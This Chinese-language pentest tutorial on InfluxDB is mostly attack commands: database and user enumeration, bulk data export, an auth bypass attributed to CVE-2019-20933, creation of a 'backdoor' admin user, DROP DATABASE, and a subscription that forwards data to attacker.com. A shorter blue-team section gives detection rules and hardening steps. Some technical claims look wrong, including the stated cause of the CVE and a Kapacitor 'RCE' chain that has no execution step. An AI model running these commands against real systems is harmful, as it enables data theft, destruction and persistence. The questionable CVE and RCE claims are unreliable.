---
title: "InfluxDB HTTP API 未授权访问 / 认证绕过 / 数据窃取利用技术"
date: 2026-06-21T10:00:00+08:00
draft: false
weight: 96
description: "InfluxDB 时序数据库渗透测试：HTTP API 未授权访问、CVE-2019-20933 认证绕过、数据读写与窃取、Kapacitor 联动 RCE 链路与蓝队检测方案"
categories: ["安全", "渗透测试"]
tags: ["InfluxDB", "HTTP API", "认证绕过", "CVE-2019-20933", "时序数据库", "数据窃取", "渗透测试"]
---

## 0x00 攻击面总览

InfluxDB 是时序数据库，默认配置下 HTTP API 无认证，存在认证绕过漏洞：

| 组件 | 默认端口 | 协议 | 攻击面 |
|------|---------|------|--------|
| HTTP API | 8086 | HTTP | 查询、写入、管理（默认无认证） |
| HTTPS API | 8086 | HTTPS | 加密 HTTP 接口 |
| RPC | 8088 | TCP | 集群间通信 |
| Graphite | 2003 | TCP | Graphite 协议输入 |
| Collectd | 25826 | UDP | Collectd 协议输入 |
| OpenTSDB | 4242 | TCP | OpenTSDB 协议输入 |

**核心威胁模型**：

```
┌───────────────────────────────────────────────────────────────┐
│                    InfluxDB 攻击面                              │
│                                                               │
│  ┌──────────────────────────────────────────────────────┐     │
│  │  InfluxDB HTTP API :8086                              │     │
│  │  默认无认证 / CVE-2019-20933 认证绕过                  │     │
│  └──────────────────────┬───────────────────────────────┘     │
│                         │                                     │
│  攻击路径：                                                    │
│  ① HTTP API :8086 → 未授权访问 → 数据库枚举/数据窃取           │
│  ② CVE-2019-20933 → Accept 头认证绕过 → 管理员权限             │
│  ③ HTTP API → 数据写入 → 数据投毒 → Kapacitor 联动 RCE        │
│  ④ HTTP API → 用户管理 → 创建后门用户 → 持久化                 │
│  ⑤ HTTP API → Subscription → SSRF                             │
│                                                               │
│  默认风险：                                                    │
│  • HTTP API 默认无认证（auth-enabled = false）                  │
│  • CVE-2019-20933 允许绕过认证（< 1.7.6）                      │
│  • 写入操作无速率限制                                           │
│  • 数据默认不加密                                               │
└───────────────────────────────────────────────────────────────┘
```

---

## 0x01 服务识别与指纹

### 1.1 Nmap 服务发现

```bash
nmap -sV -p 8086,8088,2003,25826,4242 \
  --script=http-title \
  -oN influxdb_scan.txt <target>
```

**典型扫描结果**：

```
PORT     STATE SERVICE     VERSION
8086/tcp open  http        InfluxDB HTTP API
```

### 1.2 版本指纹

```bash
# 获取 InfluxDB 版本
curl -s -I "http://target:8086/ping"

# 响应示例
HTTP/1.1 204 No Content
Content-Type: application/json
Request-Id: request-id
X-Influxdb-Build: OSS
X-Influxdb-Version: 1.8.10
X-Request-Id: request-id
Date: Thu, 20 Jun 2026 00:00:00 GMT

# 获取健康状态
curl -s "http://target:8086/ping"
```

### 1.3 Shodan / FOFA 搜索语法

```
# Shodan
http.html:"InfluxDB"
port:8086 http.title:"InfluxDB"
product:"InfluxDB"

# FOFA
body="InfluxDB" && port="8086"
app="InfluxDB"
```

---

## 0x02 未授权访问 — 数据窃取

### 2.1 数据库枚举

```bash
# 列出所有数据库
curl -s "http://target:8086/query?q=SHOW+DATABASES" | python3 -m json.tool

# 响应示例
{
  "results": [
    {
      "statement_id": 0,
      "series": [
        {
          "name": "databases",
          "columns": ["name"],
          "values": [
            ["_internal"],
            ["telegraf"],
            ["production_metrics"],
            ["user_activity"]
          ]
        }
      ]
    }
  ]
}
```

### 2.2 数据读取

```bash
# 列出数据库中的表（measurement）
curl -s "http://target:8086/query?db=production_metrics&q=SHOW+MEASUREMENTS" | python3 -m json.tool

# 读取表数据
curl -s "http://target:8086/query?db=production_metrics&q=SELECT+*+FROM+cpu+LIMIT+10" | python3 -m json.tool

# 读取用户活动数据
curl -s "http://target:8086/query?db=user_activity&q=SELECT+*+FROM+login_events+WHERE+time+>+now()-1h" | python3 -m json.tool
```

### 2.3 用户枚举

```bash
# 列出所有用户
curl -s "http://target:8086/query?q=SHOW+USERS" | python3 -m json.tool

# 响应示例
{
  "results": [
    {
      "statement_id": 0,
      "series": [
        {
          "columns": ["user", "admin"],
          "values": [
            ["admin", true],
            ["grafana", false],
            ["telegraf", false]
          ]
        }
      ]
    }
  ]
}
```

### 2.4 数据导出

```bash
# 导出为 CSV 格式
curl -s "http://target:8086/query?db=production_metrics&q=SELECT+*+FROM+cpu&format=csv" > metrics.csv

# 导出大量数据
curl -s "http://target:8086/query?db=user_activity&q=SELECT+*+FROM+login_events+LIMIT+100000" > activity.json
```

---

## 0x03 CVE-2019-20933 — 认证绕过

### 3.1 漏洞概述

| 属性 | 详情 |
|------|------|
| 影响版本 | InfluxDB < 1.7.6 |
| CVSS | 9.8（Critical） |
| 类型 | 认证绕过 |
| 攻击向量 | HTTP API `Accept: application/json` 头 |
| 根因 | 认证中间件在内容协商分支中跳过用户验证 |

### 3.2 漏洞利用

```bash
# 即使启用了认证，也可以通过添加 Accept 头绕过
curl -s -H "Accept: application/json" \
  "http://target:8086/query?q=SHOW+DATABASES" | python3 -m json.tool

# 读取受保护数据库
curl -s -H "Accept: application/json" \
  "http://target:8086/query?db=secret_db&q=SELECT+*+FROM+credentials" | python3 -m json.tool

# 创建管理员用户
curl -s -X POST -H "Accept: application/json" \
  "http://target:8086/query?q=CREATE+USER+backdoor+WITH+PASSWORD+'password'+WITH+ALL+PRIVILEGES"
```

### 3.3 漏洞原理

```
请求 → authenticate() 中间件
    │
    ▼
检查 Accept 头
    │
    ├─ Accept: application/json → 跳过 user == nil 检查 → 认证绕过
    │
    └─ 其他 Accept → 正常认证流程
```

---

## 0x04 数据写入与投毒

### 4.1 数据写入

```bash
# 写入单条数据
curl -s -X POST "http://target:8086/write?db=production_metrics" \
  -d 'cpu,host=server01 value=0.64'

# 写入多条数据
curl -s -X POST "http://target:8086/write?db=production_metrics" \
  -d 'cpu,host=server01 value=0.64
cpu,host=server02 value=0.85
memory,host=server01 value=1073741824'

# 带时间戳写入
curl -s -X POST "http://target:8086/write?db=production_metrics" \
  -d 'cpu,host=server01 value=0.64 1687234567890000000'
```

### 4.2 数据库管理

```bash
# 创建数据库
curl -s -X POST "http://target:8086/query?q=CREATE+DATABASE+backdoor_db"

# 删除数据库
curl -s -X POST "http://target:8086/query?q=DROP+DATABASE+production_metrics"

# 创建保留策略
curl -s -X POST "http://target:8086/query?q=CREATE+RETENTION+POLICY+forever+ON+production_metrics+DURATION+INF+REPLICATION+1+DEFAULT"
```

### 4.3 用户管理

```bash
# 创建管理员用户
curl -s -X POST "http://target:8086/query?q=CREATE+USER+backdoor+WITH+PASSWORD+'password'+WITH+ALL+PRIVILEGES"

# 授予权限
curl -s -X POST "http://target:8086/query?q=GRANT+ALL+ON+production_metrics+TO+backdoor"

# 删除用户
curl -s -X POST "http://target:8086/query?q=DROP+USER+admin"
```

---

## 0x05 Kapacitor 联动 — 数据投毒 → RCE

### 5.1 攻击链

```
InfluxDB HTTP API (8086)
    │
    ▼
写入恶意数据到监控指标
    │
    ▼
Kapacitor 触发告警规则
    │
    ▼
执行告警回调（HTTP/Webhook）
    │
    ▼
回调指向攻击者服务器 → RCE
```

### 5.2 数据投毒触发告警

```bash
# 写入触发 Kapacitor 告警的恶意数据
curl -s -X POST "http://target:8086/write?db=telegraf" \
  -d 'cpu,host=server01 usage_idle=0.0 1687234567890000000'

# 当 Kapacitor 检测到 CPU 使用率 100% 时触发告警
# 告警回调可被配置为攻击者控制的服务器
```

---

## 0x06 Subscription — SSRF

### 6.1 创建订阅

```bash
# 创建订阅将数据转发到攻击者服务器
curl -s -X POST "http://target:8086/query" \
  -d 'q=CREATE+SUBSCRIPTION+"evil_sub" ON "production_metrics"."autogen" DESTINATIONS ANY '\''http://attacker.com:8888/influx'\'''

# 数据将被转发到攻击者服务器
```

---

## 0x07 历史 CVE 漏洞矩阵

| CVE | 类型 | CVSS | 影响 |
|-----|------|------|------|
| CVE-2019-20933 | 认证绕过 | 9.8 | Accept 头认证绕过 |
| CVE-2019-19717 | 信息泄露 | 5.3 | 错误信息泄露敏感数据 |
| CVE-2020-28132 | SSRF | 7.5 | Subscription SSRF |
| CVE-2021-32973 | 权限提升 | 8.8 | 权限检查绕过 |

**CVE-2019-20933 影响范围**：

InfluxDB < 1.7.6。攻击者通过添加 `Accept: application/json` 请求头绕过认证，获得完整管理员权限。CVSS 9.8。

---

## 0x08 蓝队检测方案

### 8.1 网络层检测

```yaml
title: InfluxDB HTTP API 外部访问检测
id: influxdb-http-external-access
status: experimental
description: 检测来自非内网段的 InfluxDB HTTP API 访问
logsource:
  category: firewall
detection:
  selection:
    dst_port:
      - 8086
    src_ip|not:
      - "10.0.0.0/8"
      - "172.16.0.0/12"
      - "192.168.0.0/16"
  condition: selection
level: critical
```

### 8.2 认证绕过检测

```yaml
title: InfluxDB CVE-2019-20933 认证绕过检测
id: influxdb-cve-2019-20933-exploit
status: experimental
description: 检测 InfluxDB CVE-2019-20933 认证绕过攻击
logsource:
  product: influxdb
  service: httpd
detection:
  selection_bypass:
    headers|contains: "Accept: application/json"
    authenticated: false
    status: 200
  condition: selection_bypass
level: critical
```

### 8.3 审计日志分析

```bash
# 监控查询操作
grep "query" /var/log/influxdb/influxd.log

# 检测异常用户创建
grep -E "(CREATE USER|GRANT ALL)" /var/log/influxdb/influxd.log

# 检测数据库删除
grep "DROP DATABASE" /var/log/influxdb/influxd.log

# 检测订阅创建
grep "CREATE SUBSCRIPTION" /var/log/influxdb/influxd.log

# 监控认证绕过尝试
grep "Accept: application/json" /var/log/influxdb/influxd.log
```

### 8.4 加固清单

```
[ ] 升级至 InfluxDB >= 1.7.6（修复 CVE-2019-20933）
[ ] 启用认证：auth-enabled = true
[ ] 配置 HTTPS：https-enabled = true
[ ] InfluxDB HTTP API (8086) 仅允许内网访问
[ ] 配置防火墙规则限制 8086 端口访问源
[ ] 在前面放置反向代理并启用认证
[ ] 禁用不必要的协议端口（Graphite/Collectd/OpenTSDB）
[ ] 配置 RBAC 最小权限
[ ] 定期审查用户列表和权限
[ ] 监控异常查询模式（DROP DATABASE、CREATE USER）
[ ] 启用审计日志并接入 SIEM
[ ] 配置 Subscription 白名单
[ ] 定期备份数据
[ ] 升级至 InfluxDB 2.x（默认启用认证）
```

---

## 0x09 渗透测试检查清单

```
[ ] 端口扫描：8086, 8088, 2003, 25826, 4242
[ ] HTTP API (8086) 未授权访问测试
[ ] 版本信息收集（/ping 端点）
[ ] 数据库枚举（SHOW DATABASES）
[ ] 数据读取测试（SELECT 查询）
[ ] 用户枚举（SHOW USERS）
[ ] CVE-2019-20933 认证绕过测试（Accept 头）
[ ] 数据写入测试（/write 端点）
[ ] 数据库创建/删除测试
[ ] 用户创建/删除测试
[ ] Subscription SSRF 测试
[ ] Kapacitor 联动攻击链测试
[ ] 认证配置检查
[ ] TLS/SSL 配置检查
[ ] 不必要协议端口检查
```

---

## 0x10 小结

InfluxDB 的攻击面以 **HTTP API（端口 8086）** 为核心。默认配置下 HTTP API 无认证，攻击者可以直接枚举数据库、读取敏感时序数据、写入恶意数据。**CVE-2019-20933**（CVSS 9.8）通过 `Accept: application/json` 请求头绕过认证，即使启用了认证也能获得管理员权限。数据投毒可触发 Kapacitor 告警规则实现 RCE，Subscription 功能可用于 SSRF。蓝队应重点关注：升级至 1.7.6+、启用认证、配置 HTTPS、限制网络访问、禁用不必要协议、将审计日志接入 SIEM。
